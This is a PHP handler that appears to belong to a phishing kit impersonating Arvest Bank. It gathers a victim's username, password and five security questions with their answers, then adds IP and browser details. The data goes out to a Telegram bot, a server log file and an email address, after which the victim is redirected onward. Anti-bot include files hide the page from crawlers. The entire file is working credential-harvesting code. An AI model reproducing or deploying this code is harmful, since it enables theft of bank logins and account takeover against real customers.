<?php

session_start();
error_reporting(0);


include('../Antibot/Bot-Crawler.php');
include('../Antibot/Dila_DZ.php');

include('../Antibot/blockers.php');
include('../Antibot/detects.php');

include('../config.php');
include('../functions/get_browser.php');
include('../functions/get_ip.php');
$TIME_DATE = date('H:i:s d/m/Y');


$_SESSION['question1'] = $_POST['question1'];
$_SESSION['answer1'] = $_POST['answer1'];

$_SESSION['question2'] = $_POST['question2'];
$_SESSION['answer2'] = $_POST['answer2'];

$_SESSION['question3'] = $_POST['question3'];
$_SESSION['answer3'] = $_POST['answer3'];

$_SESSION['question4'] = $_POST['question4'];
$_SESSION['answer4'] = $_POST['answer4'];

$_SESSION['question5'] = $_POST['question5'];
$_SESSION['answer5'] = $_POST['answer5'];

$Z118_MESSAGE .= "

[ ARVEST SECURITY INFO]
[ USER SECURITY INFORMATION]

++++++++++++++++++++++++++++++++++++++++

[Username] = ".$_SESSION['first_userids']."
[Password] = ".$_SESSION['_my_password_']."

++++++++++++++++++++++++++++++++++++++++

[Q1] = ".$_POST['question1']."
[A1] = ".$_POST['answer1']."

[Q2] = ".$_POST['question2']."
[A2] = ".$_POST['answer2']."

[Q3] = ".$_POST['question3']."
[A3] = ".$_POST['answer3']."

[Q4] = ".$_POST['question4']."
[A4] = ".$_POST['answer4']."

[Q5] = ".$_POST['question5']."
[A5] = ".$_POST['answer5']."


[VICTIM INFORMATION]

[TIME/DATE]    = ".$TIME_DATE."
[IP INFO] = http://ip-api.com/json/".$_SESSION['_ip_']."
[REMOTE IP]    = ".$_SERVER['REMOTE_ADDR']."
[BROWSER] = ".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."
[BROWSER] = ".$_SERVER['HTTP_USER_AGENT']."
";

if (!empty($_POST['answer2'])){
	
	if($send_results_to_telegram == "on") {
		$data = [
			'text' => ''.$Z118_MESSAGE.'',
			'chat_id' => ''.$chat_id.''
		];
		file_get_contents("https://api.telegram.org/bot".$bot_token."/sendMessage?" . http_build_query($data) );
	}
	
	
	if ($save_results_to_cpanel == "on") {
		$res_file = fopen("../logs/SECURITY.txt", "a");
		fwrite($res_file, $Z118_MESSAGE);
	}
	
	if($send_results_to_email == "on") {
		
		$Z118_MESSAGE .= "
		################ [ ARVEST BANK SECURITY INFORMATION ] ####################
		±±±±±±±±±±±±±±±±±[ SECURITY INFORMATION ]±±±±±±±±±±±±±±±±±±±±

		[Username] = ".$_SESSION['first_userids']."
		[Password] = ".$_SESSION['_my_password_'] ."

		++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

		[Question1] = ".$_POST['question1']."
		[Answer 1] = ".$_POST['answer1']."

		[Question2] = ".$_POST['question2']."
		[Answer 2] = ".$_POST['answer2']."

		[Question3] = ".$_POST['question3']."
		[Answer 3] = ".$_POST['answer3']."
		
		[Question4] = ".$_POST['question4']."
		[Answer 4] = ".$_POST['answer4']."
		
		[Question5] = ".$_POST['question5']."
		[Answer 5] = ".$_POST['answer5']."

		±±±±±±±±±±±±±±±±[ VICTIM INFORMATION ]±±±±±±±±±±±±±±±±±±±

		[TIME/DATE]    = ".$TIME_DATE."
		[IP INFO] = http://ip-api.com/json/".$_SESSION['_ip_']."
		[REMOTE IP]    = ".$_SERVER['REMOTE_ADDR']."
		[BROWSER] = ".Z118_Browser($_SERVER['HTTP_user_AGENT'])." On ".Z118_OS($_SERVER['HTTP_user_AGENT'])."
		[BROWSER] = ".$_SERVER['HTTP_user_AGENT']."

		################## [BY @X_hammer] #####################
		\n";

		$Z118_SUBJECT = "✪ LOGIN FROM : ✪ ".$_SESSION['userids']." ✪";
		$Z118_HEADERS .= "From:XD <X-hammer@logs.com>";
		$Z118_HEADERS .= "MIME-Version: 1.0\n";
		$Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";	
		@mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
	}
	
	if($redirect_to_next_page == "on") {
		Header("Location: ../../email.php");
	}
}

		
?>